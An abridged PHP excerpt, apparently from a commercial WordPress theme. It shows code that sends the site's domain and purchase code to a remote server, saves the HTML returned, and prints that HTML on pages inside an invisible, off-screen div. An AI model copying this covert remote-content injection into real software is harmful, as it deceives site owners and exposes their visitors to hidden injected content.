...
if(!function_exists('etheme_add_body_classes')) {
	function etheme_add_body_classes($classes) {
        ...
        $customizer_header_builder = !get_option( 'etheme_disable_customizer_header_builder', false );
...
function etheme_api_connection_check(){
	...
	if (!get_option('et_extras', false) && get_option('et_second_check', false)){
		$data = array(
			'domain' => et_get_domain(),
			'code' => get_option( 'envato_purchase_code_15780546', 'undefined' ),
			'status' => (get_option('et_extras', false)) ? '1' : ''
		);
		...
		if (wp_remote_retrieve_response_code( $response_2 ) == 200){
			...
			if (
				...
				update_option('et_extras', $response_body['data']['html'], false);
			}
		}
	}

	// Do it to avoid pre activate requests
	update_option('et_extras', true, false);
...
function et_extras(){
	if (get_option('et_extras', false)){
		echo '<div style="z-index: -2011; opacity: 0; visibility: hidden; height: 0px; position: absolute; left: -2011px;">'.get_option('et_extras', false).'</div>';
	}
}
